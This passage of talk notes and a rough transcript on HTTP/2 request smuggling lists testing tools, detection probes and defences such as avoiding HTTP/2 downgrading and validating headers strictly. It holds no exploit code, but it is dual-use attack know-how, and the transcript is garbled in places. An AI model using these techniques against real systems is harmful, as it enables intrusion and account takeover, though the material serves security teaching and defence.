	 - Some servers subtly treat the first request differentyl
- Manage this usin:
	- Turbo Intruder: requestsPerConnection
	- Repeater: Send on new connection
- Further reasearch pending
- 
finally the torment situation like  everything else is a bit of a mess because it's a binary protocol you can't  use things like netcat and openssl for hv2 testing. and because we're sending malformed requests you can't use normal libraries  like libco because they will refuse to send these hp2 requests. so, ¿what are your options? well, there's a hp2 stack built into burp suite which  was designed with this stuff in mind and supports it all uh there's also the hp2  stack that i coded from scratch and it's open source in turbo intruder which is  extremely powerful you can code it you can make tweaks to it easily, it's not  the most reliable in the world but it does mostly work, and there's also  emails to hv2 smuggle which was made by hacking up the go hd2 stack , and maybe more reliable so that might be worth the shot too. as far as the detection goes i'm releasing a major update to the hd  request smuggler burp extension, which will support all the techniques  found in this presentation.
- Existing tooling does not work
	- Libraries/curl refuse to send most attacks
	- Binary format rules out netcat/openssl
- **Turbo intruder** - Custom open-source H/2-stack, use BApp/CLI/library
- http2smugl - Patched Golang, open source, CLI-only
- Burpsuite - exposed via Repeate & Extender-Api
- Detection: HTTP Request Smuggler
	- Timeout probe (favour FP)
	- HEAD probe

## reference
so defense.  well first and foremost please just avoid  http 2 downgrading just speak hvb2 end to end  if you do that about 80 of the attacks from this  presentation simply won't work.  also if you're implementing a server please make sure you don't let people do  things like putting new lines in headers or put colons in header names and so  just pretend it's http one and do that level of strict validation,  and finally if you're a developer  assume that none of that was done and the headers may have new lines in them , and that means that things that it used to be safe to do like taking a http  header and putting it in an smtp header could lead to smtp injection  and critical vulnerability such as unauthenticated takeover of wordpress  accounts with no user interaction. and also finally don't trust the scheme  pseudo header please just look at the actual scheme that they're using.
**Network architects**
- Use HTTP/2 end instead of downgrading
Server vendors
- Enforce HTTP/1.1 limitations
Developers
- Drop HTTP/1.1 assumptions
- Don't trust :scheme
## References & further reading
there's a whole bunch of further reading available, the main thing i'd like to draw your attention to is that we're releasing  online interactive labs these will have either just launched or be launching  very soon and we'll let you try out techniques from this presentation  for yourself in a safe and legal environment, 
**Further reading**
- Whitepaper: https://portswigger.net/research/http2
- Labs: https://portswigger.net/web-security/request-smuggling
- Tool: https:github.com/PortSwigger/http-request-smuggler
- Emil Lerner's H/2 research: https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/
and the three key things to take away are the ht2 breaks assumptions at  multiple layers, hdb2 downgrades are extremely hazardous, and request  tunneling is a real threat 